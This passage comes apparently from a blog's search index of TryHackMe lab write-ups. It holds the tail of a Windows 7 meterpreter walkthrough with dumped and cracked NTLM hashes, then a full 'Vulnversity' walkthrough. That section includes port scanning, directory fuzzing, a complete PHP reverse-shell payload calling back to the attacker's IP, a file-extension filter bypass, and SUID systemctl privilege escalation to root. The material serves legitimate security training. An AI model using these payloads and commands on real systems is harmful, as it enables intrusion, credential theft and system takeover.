=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.162.1:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.162.1:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= meterpreter \u0026gt; We now got a meterpreter shell. Let\u0026rsquo;s quickly find out the information about the machine.\nmeterpreter \u0026gt; getsystem [-] Already running as SYSTEM meterpreter \u0026gt; sysinfo Computer : JON-PC OS : Windows 7 (6.1 Build 7601, Service Pack 1). Architecture : x64 System Language : en_US Domain : WORKGROUP Logged On Users : 0 Meterpreter : x64/windows We are logged in as nt authority\\system. Now we have all privileges to the machine.\nWe can run hashdump in the meterpreter shell to get the hashes.\nmeterpreter \u0026gt; hashdump Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d::: Now we will crack the hash of user Jon with John The Ripper.\njohn hash.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt ❯ cat hash.txt Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d::: ❯ john hash.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (NT [MD4 128/128 ASIMD 4x2]) Warning: no OpenMP support for this hash type, consider --fork=4 Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status alqfna22 (Jon) 1g 0:00:00:00 DONE (2024-05-24 18:52) 1.098g/s 11209Kp/s 11209Kc/s 11209KC/s alshaneebalshaneeb..alphaneons Use the \u0026#34;--show --format=NT\u0026#34; options to display all of the cracked passwords reliably Session completed. root@kali ~/tryhackme ❯ Now let\u0026rsquo;s find the flags. The first flag is located in the location C:\\ .\nmeterpreter \u0026gt; dir C:/ Listing: C:/ ============ Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 040777/rwxrwxrwx 0 dir 2018-12-12 22:13:36 -0500 $Recycle.Bin 040777/rwxrwxrwx 0 dir 2009-07-14 01:08:56 -0400 Documents and Settings 040777/rwxrwxrwx 0 dir 2009-07-13 23:20:08 -0400 PerfLogs 040555/r-xr-xr-x 4096 dir 2019-03-17 18:22:01 -0400 Program Files 040555/r-xr-xr-x 4096 dir 2019-03-17 18:28:38 -0400 Program Files (x86) 040777/rwxrwxrwx 4096 dir 2019-03-17 18:35:57 -0400 ProgramData 040777/rwxrwxrwx 0 dir 2018-12-12 22:13:22 -0500 Recovery 040777/rwxrwxrwx 4096 dir 2024-05-24 18:50:58 -0400 System Volume Information 040555/r-xr-xr-x 4096 dir 2018-12-12 22:13:28 -0500 Users 040777/rwxrwxrwx 16384 dir 2019-03-17 18:36:30 -0400 Windows 100666/rw-rw-rw- 24 fil 2019-03-17 15:27:21 -0400 flag1.txt 000000/--------- 0 fif 1969-12-31 19:00:00 -0500 hiberfil.sys 000000/--------- 0 fif 1969-12-31 19:00:00 -0500 pagefile.sys meterpreter \u0026gt; The second flag is located at the location where passwords are stored. The passwords are stored in SAM file. So, the second flag would be in the location C: \\windows\\system32\\config.\nmeterpreter \u0026gt; dir C:/windows\\/system32/config Listing: C:/windows/system32/config =================================== 100666/rw-rw-rw- 12582912 fil 2024-05-24 18:52:09 -0400 SYSTEM 100666/rw-rw-rw- 1024 fil 2011-04-12 04:32:06 -0400 SYSTEM.LOG 100666/rw-rw-rw- 262144 fil 2024-05-24 18:52:09 -0400 SYSTEM.LOG1 100666/rw-rw-rw- 0 fil 2009-07-13 22:34:08 -0400 SYSTEM.LOG2 100666/rw-rw-rw- 65536 fil 2019-03-17 18:21:22 -0400 SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf 100666/rw-rw-rw- 524288 fil 2019-03-17 18:21:22 -0400 SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms 100666/rw-rw-rw- 524288 fil 2019-03-17 18:21:22 -0400 SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms 040777/rwxrwxrwx 4096 dir 2018-12-12 18:03:05 -0500 TxR 100666/rw-rw-rw- 34 fil 2019-03-17 15:32:48 -0400 flag2.txt 040777/rwxrwxrwx 4096 dir 2010-11-20 21:41:37 -0500 systemprofile meterpreter \u0026gt; The third flag is located in the Documents folder of the user Jon.\nmeterpreter \u0026gt; dir C:/Users/Jon/Documents Listing: C:/Users/Jon/Documents =============================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 040777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 My Music 040777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 My Pictures 040777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 My Videos 100666/rw-rw-rw- 402 fil 2018-12-12 22:13:48 -0500 desktop.ini 100666/rw-rw-rw- 37 fil 2019-03-17 15:26:36 -0400 flag3.txt meterpreter \u0026gt; "},{"id":11,"href":"/posts/Vulnversity/","title":"Vulnversity","section":"Blog","content":" Learn about active recon, web app attacks and privilege escalation.\nhttps://tryhackme.com/r/room/vulnversity\nScanning # Scan the machine for open ports using nmap.\n❯ rustscan -a 10.10.118.9 -- -sVC .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-\u0026#39; `-\u0026#39;`-----\u0026#39;`----\u0026#39; `-\u0026#39; `----\u0026#39; `---\u0026#39; `-\u0026#39; `-\u0026#39;`-\u0026#39; `-\u0026#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan [~] The config file is expected to be at \u0026#34;/root/.rustscan.toml\u0026#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan\u0026#39;s speed. Use the Docker image, or up the Ulimit with \u0026#39;--ulimit 5000\u0026#39;. Open 10.10.118.9:21 Open 10.10.118.9:22 Open 10.10.118.9:139 Open 10.10.118.9:445 Open 10.10.118.9:3128 Open 10.10.118.9:3333 [~] Starting Script(s) [\u0026gt;] Running script \u0026#34;nmap -vvv -p {{port}} {{ip}} -sVC\u0026#34; on ip 10.10.118.9 Depending on the complexity of the script, results may take some time to appear. [~] Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-24 03:31 EDT NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 03:31 Completed NSE at 03:31, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 03:31 Completed NSE at 03:31, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 03:31 Completed NSE at 03:31, 0.00s elapsed Initiating Ping Scan at 03:31 Scanning 10.10.118.9 [4 ports] Completed Ping Scan at 03:31, 0.15s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 03:31 Completed Parallel DNS resolution of 1 host. at 03:31, 0.04s elapsed DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0] Initiating SYN Stealth Scan at 03:31 Scanning 10.10.118.9 [6 ports] Discovered open port 21/tcp on 10.10.118.9 Discovered open port 445/tcp on 10.10.118.9 Discovered open port 22/tcp on 10.10.118.9 Discovered open port 139/tcp on 10.10.118.9 Discovered open port 3333/tcp on 10.10.118.9 Discovered open port 3128/tcp on 10.10.118.9 Completed SYN Stealth Scan at 03:31, 0.16s elapsed (6 total ports) Initiating Service scan at 03:31 Scanning 6 services on 10.10.118.9 Completed Service scan at 03:32, 21.88s elapsed (6 services on 1 host) NSE: Script scanning 10.10.118.9. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 03:32 Completed NSE at 03:32, 4.91s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 03:32 Completed NSE at 03:32, 0.85s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 03:32 Completed NSE at 03:32, 0.00s elapsed Nmap scan report for 10.10.118.9 Host is up, received echo-reply ttl 61 (0.12s latency). Scanned at 2024-05-24 03:31:47 EDT for 28s PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ttl 61 vsftpd 3.0.3 22/tcp open ssh syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 5a4ffcb8c8761cb5851cacb286411c5a (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDYQExoU9R0VCGoQW6bOwg0U7ILtmfBQ3x/rdK8uuSM/fEH80hgG81Xpqu52siXQXOn1hpppYs7rpZN+KdwAYYDmnxSPVwkj2yXT9hJ/fFAmge3vk0Gt5Kd8q3CdcLjgMcc8V4b8v6UpYemIgWFOkYTzji7ZPrTNlo4HbDgY5/F9evC9VaWgfnyiasyAT6aio4hecn0Sg1Ag35NTGnbgrMmDqk6hfxIBqjqyYLPgJ4V1QrqeqMrvyc6k1/XgsR7dlugmqXyICiXu03zz7lNUf6vuWT707yDi9wEdLE6Hmah78f+xDYUP7iNA0raxi2H++XQjktPqjKGQzJHemtPY5bn | 256 ac9dec44610c28850088e968e9d0cb3d (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHCK2yd1f39AlLoIZFsvpSlRlzyO1wjBoVy8NvMp4/6Db2TJNwcUNNFjYQRd5EhxNnP+oLvOTofBlF/n0ms6SwE= | 256 3050cb705a865722cb52d93634dca558 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqh93OTpuL32KRVEn9zL/Ybk+5mAsT/81axilYUUvUB 139/tcp open netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn syn-ack ttl 61 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) 3128/tcp open http-proxy syn-ack ttl 61 Squid http proxy 3.5.12 |_http-server-header: squid/3.5.12 |_http-title: ERROR: The requested URL could not be retrieved 3333/tcp open http syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Vuln University |_http-server-header: Apache/2.4.18 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s | smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu) | Computer name: vulnuniversity | NetBIOS computer name: VULNUNIVERSITY\\x00 | Domain name: \\x00 | FQDN: vulnuniversity |_ System time: 2024-05-24T03:32:10-04:00 | smb2-time: | date: 2024-05-24T07:32:10 |_ start_date: N/A | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 11877/tcp): CLEAN (Couldn\u0026#39;t connect) | Check 2 (port 64173/tcp): CLEAN (Couldn\u0026#39;t connect) | Check 3 (port 15194/udp): CLEAN (Failed to receive data) | Check 4 (port 35923/udp): CLEAN (Failed to receive data) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 000000000000 (Xerox) | Names: | VULNUNIVERSITY\u0026lt;00\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | VULNUNIVERSITY\u0026lt;03\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | VULNUNIVERSITY\u0026lt;20\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | \\x01\\x02__MSBROWSE__\\x02\u0026lt;01\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;00\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;1d\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;1e\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | Statistics: | 0000000000000000000000000000000000 | 0000000000000000000000000000000000 |_ 0000000000000000000000000000 | smb2-security-mode: | 311: |_ Message signing enabled but not required | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) NSE: Script Post-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 03:32 Completed NSE at 03:32, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 03:32 Completed NSE at 03:32, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 03:32 Completed NSE at 03:32, 0.00s elapsed Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 28.35 seconds Raw packets sent: 10 (416B) | Rcvd: 7 (292B) There was an apache server running on port 3333.\nEnumeration # Let\u0026rsquo;s fuzz for directories using gobuster.\n❯ gobuster dir -w ~/tools/wordlists/directory-list-2.3-small.txt -u http://10.10.118.9:3333/ =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.118.9:3333/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /root/tools/wordlists/directory-list-2.3-small.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 322] [--\u0026gt; http://10.10.118.9:3333/images/] /css (Status: 301) [Size: 319] [--\u0026gt; http://10.10.118.9:3333/css/] /js (Status: 301) [Size: 318] [--\u0026gt; http://10.10.118.9:3333/js/] /fonts (Status: 301) [Size: 321] [--\u0026gt; http://10.10.118.9:3333/fonts/] /internal (Status: 301) [Size: 324] [--\u0026gt; http://10.10.118.9:3333/internal/] =============================================================== Finished =============================================================== There is a path /internal/ with a file upload functionality.\nExploitation # Upon viewing it, there was a file upload functionality. Using this we can upload a malicious php file to get a reverse shell.\nCopy the php file from the following resource and edit the ip address to tun0 ip address.\nhttps://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php\nLet us try to upload a php file and see if it\u0026rsquo;s accepting the file type. The file type php is not accepted.\nStart Burp Suite and configure the proxy in the browser.\nUpload the php file that we just created and capture the request in Burp.\nPOST /internal/index.php HTTP/1.1 Host: 10.10.118.9:3333 User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: multipart/form-data; boundary=---------------------------7905088481562265153553597258 Content-Length: 5845 Origin: http://10.10.118.9:3333 Connection: close Referer: http://10.10.118.9:3333/internal/ Upgrade-Insecure-Requests: 1 -----------------------------7905088481562265153553597258 Content-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;php-reverse-shell.php\u0026#34; Content-Type: application/x-php \u0026lt;?php // php-reverse-shell - A Reverse Shell implementation in PHP // Copyright (C) 2007 pentestmonkey@pentestmonkey.net // // This tool may be used for legal purposes only. Users take full responsibility // for any actions performed using this tool. The author accepts no liability // for damage caused by this tool. If these terms are not acceptable to you, then // do not use this tool. // // In all other respects the GPL version 2 applies: // // This program is free software; you can redistribute it and/or modify // it under the terms of the GNU General Public License version 2 as // published by the Free Software Foundation. // // This program is distributed in the hope that it will be useful, // but WITHOUT ANY WARRANTY; without even the implied warranty of // MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the // GNU General Public License for more details. // // You should have received a copy of the GNU General Public License along // with this program; if not, write to the Free Software Foundation, Inc., // 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. // // This tool may be used for legal purposes only. Users take full responsibility // for any actions performed using this tool. If these terms are not acceptable to // you, then do not use this tool. // // You are encouraged to send comments, improvements or suggestions to // me at pentestmonkey@pentestmonkey.net // // Description // ----------- // This script will make an outbound TCP connection to a hardcoded IP and port. // The recipient will be given a shell running as the current user (apache normally). // // Limitations // ----------- // proc_open and stream_set_blocking require PHP version 4.3+, or 5+ // Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows. // Some compile-time options are needed for daemonisation (like pcntl, posix). These are rarely available. // // Usage // ----- // See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck. set_time_limit (0); $VERSION = \u0026#34;1.0\u0026#34;; $ip = \u0026#39;10.6.10.164\u0026#39;; // CHANGE THIS $port = 4444; // CHANGE THIS $chunk_size = 1400; $write_a = null; $error_a = null; $shell = \u0026#39;uname -a; w; id; /bin/sh -i\u0026#39;; $daemon = 0; $debug = 0; // // Daemonise ourself if possible to avoid zombies later // // pcntl_fork is hardly ever available, but will allow us to daemonise // our php process and avoid zombies. Worth a try... if (function_exists(\u0026#39;pcntl_fork\u0026#39;)) { // Fork and have the parent process exit $pid = pcntl_fork(); if ($pid == -1) { printit(\u0026#34;ERROR: Can\u0026#39;t fork\u0026#34;); exit(1); } if ($pid) { exit(0); // Parent exits } // Make the current process a session leader // Will only succeed if we forked if (posix_setsid() == -1) { printit(\u0026#34;Error: Can\u0026#39;t setsid()\u0026#34;); exit(1); } $daemon = 1; } else { printit(\u0026#34;WARNING: Failed to daemonise. This is quite common and not fatal.\u0026#34;); } // Change to a safe directory chdir(\u0026#34;/\u0026#34;); // Remove any umask we inherited umask(0); // // Do the reverse shell... // // Open reverse connection $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(\u0026#34;$errstr ($errno)\u0026#34;); exit(1); } // Spawn shell process $descriptorspec = array( 0 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;r\u0026#34;), // stdin is a pipe that the child will read from 1 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;), // stdout is a pipe that the child will write to 2 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;) // stderr is a pipe that the child will write to ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(\u0026#34;ERROR: Can\u0026#39;t spawn shell\u0026#34;); exit(1); } // Set everything to non-blocking // Reason: Occsionally reads will block, even though stream_select tells us they won\u0026#39;t stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\u0026#34;Successfully opened reverse shell to $ip:$port\u0026#34;); while (1) { // Check for end of TCP connection if (feof($sock)) { printit(\u0026#34;ERROR: Shell connection terminated\u0026#34;); break; } // Check for end of STDOUT if (feof($pipes[1])) { printit(\u0026#34;ERROR: Shell process terminated\u0026#34;); break; } // Wait until a command is end down $sock, or some // command output is available on STDOUT or STDERR $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); // If we can read from the TCP socket, send // data to process\u0026#39;s STDIN if (in_array($sock, $read_a)) { if ($debug) printit(\u0026#34;SOCK READ\u0026#34;); $input = fread($sock, $chunk_size); if ($debug) printit(\u0026#34;SOCK: $input\u0026#34;); fwrite($pipes[0], $input); } // If we can read from the process\u0026#39;s STDOUT // send data down tcp connection if (in_array($pipes[1], $read_a)) { if ($debug) printit(\u0026#34;STDOUT READ\u0026#34;); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\u0026#34;STDOUT: $input\u0026#34;); fwrite($sock, $input); } // If we can read from the process\u0026#39;s STDERR // send data down tcp connection if (in_array($pipes[2], $read_a)) { if ($debug) printit(\u0026#34;STDERR READ\u0026#34;); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\u0026#34;STDERR: $input\u0026#34;); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); // Like print, but does nothing if we\u0026#39;ve daemonised ourself // (I can\u0026#39;t figure out how to redirect STDOUT like a proper daemon) function printit ($string) { if (!$daemon) { print \u0026#34;$string\\n\u0026#34;; } } ?\u0026gt; -----------------------------7905088481562265153553597258 Content-Disposition: form-data; name=\u0026#34;submit\u0026#34; Submit -----------------------------7905088481562265153553597258-- Send the request to the repeater and check the response. The response includes that php extension is not alllowed.\n\u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;index.php\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Upload\u0026lt;/h3\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; id=\u0026#34;file\u0026#34;\u0026gt; \u0026lt;input class=\u0026#34;btn btn-primary\u0026#34; type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit\u0026#34; name=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; Extension not allowed \u0026lt;/body\u0026gt; Send the request to intruder and in payload positions, select attack type as sniper and add ‘§’ to the file extension php.\nContent-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;php-reverse-shell.§php§\u0026#34; Content-Type: application/x-php Go to payload options, add the extensions php, php3, php4. php5, phtml and start the attack.\nAfter the attack was completed, we can see the results. In that sort by length and the length for phtml is 723 and for the rest of them 737. Also, for confirming that it was the correct file type allowed, check the response.\nNow, edit the file extension of the php file we created to phtml.\nUpload the file, and in another terminal start a netcat listener.\nnc -lnvp 4444 The file is uploaded into the uploads directory. In the browser, access the file we uploaded which will be present in the path.\nhttp://10.10.118.9:3333/internal/uploads/php_reverse_shell.phtml\nAfter file is accessed, we get a reverse shell.\n❯ nc -lnvp 4444 listening on [any] 4444 ... connect to [10.6.10.164] from (UNKNOWN) [10.10.118.9] 60722 Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 17:43:51 up 1:23, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ Now that we\u0026rsquo;ve got a shell, we need to stabilize the shell as it is unstable.\nRun the command to spawn a tty shell.\npython -c \u0026#34;import pty; pty.spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34; Now hit ctrl+z to background it.\nCtrl + Z Set the terminal to raw mode, disable echoing of input characters and foreground the process.\nstty raw -echo \u0026amp;\u0026amp; fg Set the terminal variable.\nexport TERM=xterm $ python -c \u0026#34;import pty; pty.spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34; www-data@vulnuniversity:/$ ^Z [1] + 29347 suspended nc -lnvp 4444 ❯ stty raw -echo \u0026amp;\u0026amp; fg [1] + 29347 continued nc -lnvp 4444 www-data@vulnuniversity:/$ export TERM=xterm www-data@vulnuniversity:/$ Privilege Escalation # Now run to find SUID files with root permission.\nfind / -user root -perm -4000 -exec ls -ldb {} \\; -rwsr-xr-x 1 root root 40128 May 16 2017 /bin/su -rwsr-xr-x 1 root root 142032 Jan 28 2017 /bin/ntfs-3g -rwsr-xr-x 1 root root 40152 May 16 2018 /bin/mount -rwsr-xr-x 1 root root 44680 May 7 2014 /bin/ping6 -rwsr-xr-x 1 root root 27608 May 16 2018 /bin/umount -rwsr-xr-x 1 root root 659856 Feb 13 2019 /bin/systemctl -rwsr-xr-x 1 root root 44168 May 7 2014 /bin/ping -rwsr-xr-x 1 root root 30800 Jul 12 2016 /bin/fusermount We found some interesting files. Of them, /bin/systemctl is running as root.\nWe will follow as mentioned in the following resource to get elevated priveleges.\nhttps://gtfobins.github.io/gtfobins/systemctl/#suid.\nWe will try to follow that to get the root shell. Instead of using the default one /bin/sh -c \u0026quot;id \u0026gt; /tmp/output\u0026quot;, we need to get a shell. So, we use this /bin/sh -c \u0026quot;chmod +s /bin/bash\u0026quot; instead of that.\nTF=$(mktemp).service echo \u0026#39;[Service] Type=oneshot ExecStart=/bin/sh -c \u0026#34;chmod +s /bin/bash\u0026#34; [Install] WantedBy=multi-user.target\u0026#39; \u0026gt; $TF ./systemctl link $TF ./systemctl enable --now $TF www-data@vulnuniversity:/$ TF=$(mktemp).service www-data@vulnuniversity:/$ echo \u0026#39;[Service] \u0026gt; Type=oneshot \u0026gt; ExecStart=/bin/sh -c \u0026#34;chmod +s /bin/bash\u0026#34; \u0026gt; [Install] \u0026gt; WantedBy=multi-user.target\u0026#39; \u0026gt; $TF www-data@vulnuniversity:/$ /bin/systemctl link $TF Created symlink from /etc/systemd/system/tmp.UnoAvXlPum.service to /tmp/tmp.UnoAvXlPum.service. www-data@vulnuniversity:/$ /bin/systemctl enable --now $TF Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.UnoAvXlPum.service to /tmp/tmp.UnoAvXlPum.service. www-data@vulnuniversity:/$ bash -p bash-4.3# id uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data) bash-4.3# cd /root bash-4.3# ls root.txt bash-4.3# We are root!!!\n"}]